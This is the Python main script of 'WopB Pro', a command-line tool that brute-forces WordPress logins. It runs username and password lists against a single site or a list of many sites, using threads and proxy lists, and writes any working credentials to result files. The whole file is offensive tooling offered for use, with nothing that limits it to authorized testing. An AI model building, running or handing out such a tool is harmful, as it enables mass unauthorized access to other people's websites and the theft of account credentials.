import argparse
import pyfiglet
import os
import sys
import time
import threading
from tqdm import tqdm

from modules.brute import brute_force
from modules.utils import save_result, load_proxies, check_wordpress

VERSION = "2.0 PRO"
GITHUB_REPO = "https://github.com/karranwang/wopb"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(pyfiglet.figlet_format("WopB Pro"))
    print("by @karranwang\n")

def single_target(url, userlist, passlist, proxy_file):
    proxies = load_proxies(proxy_file)
    if not check_wordpress(url):
        print(f"[-] {url} bukan WordPress atau ada AntiBot aktif.")
        return

    usernames = open(userlist).read().splitlines()
    passwords = open(passlist).read().splitlines()
    total = len(usernames) * len(passwords)

    bar = tqdm(total=total, desc="Bruteforcing", ncols=70)

    for username in usernames:
        for password in passwords:
            bar.update(1)
            if brute_force(url, username, password, proxies):
                print(f"\n[SUCCESS] {url} => {username}:{password}")
                save_result("result/vuln.txt", f"{url}|{username}|{password}")
                bar.close()
                return
    bar.close()
    print("\n[-] No valid credentials found.")

def mass_target(target_file, userlist, passlist, thread_count, proxy_file):
    proxies = load_proxies(proxy_file)
    sites = open(target_file).read().splitlines()
    usernames = open(userlist).read().splitlines()
    passwords = open(passlist).read().splitlines()

    def worker(site):
        if not check_wordpress(site):
            print(f"[-] {site} bukan WordPress atau ada AntiBot aktif.")
            return

        total = len(usernames) * len(passwords)
        bar = tqdm(total=total, desc=f"Bruting {site}", ncols=70)
        for username in usernames:
            for password in passwords:
                bar.update(1)
                if brute_force(site, username, password, proxies):
                    print(f"\n[SUCCESS] {site} => {username}:{password}")
                    save_result("result/mass_vuln.txt", f"{site}|{username}|{password}")
                    bar.close()
                    return
        bar.close()

    threads = []
    for site in sites:
        while threading.active_count() > thread_count:
            time.sleep(1)
        t = threading.Thread(target=worker, args=(site,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

def main():
    parser = argparse.ArgumentParser(description="WordPress Bruteforce PRO Tool by @karranwang")
    parser.add_argument('-u', '--url', help='Single target URL')
    parser.add_argument('-l', '--list', help='List of targets')
    parser.add_argument('-U', '--userlist', help='Username list file', required=False)
    parser.add_argument('-p', '--passlist', help='Password list file', required=False)
    parser.add_argument('-t', '--thread', type=int, help='Number of threads', default=5)
    parser.add_argument('--proxy', help='Proxy list file')
    parser.add_argument('--version', action='store_true', help='Show version')
    parser.add_argument('--update', action='store_true', help='Update from GitHub')
    
    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    banner()

    if args.version:
        print(f"Version: {VERSION}")
        sys.exit()

    if args.update:
        print("[*] Updating...")
        os.system(f"git clone {GITHUB_REPO}")
        sys.exit()

    if args.url and args.userlist and args.passlist:
        print("[*] Starting single target brute...")
        time.sleep(1)
        single_target(args.url, args.userlist, args.passlist, args.proxy)

    elif args.list and args.userlist and args.passlist:
        print("[*] Starting mass brute...")
        time.sleep(1)
        mass_target(args.list, args.userlist, args.passlist, args.thread, args.proxy)

    else:
        parser.print_help()

    print("\n[*] Done.")
    os.system('cls' if os.name == 'nt' else 'clear')
    sys.exit()

if __name__ == "__main__":
    main()
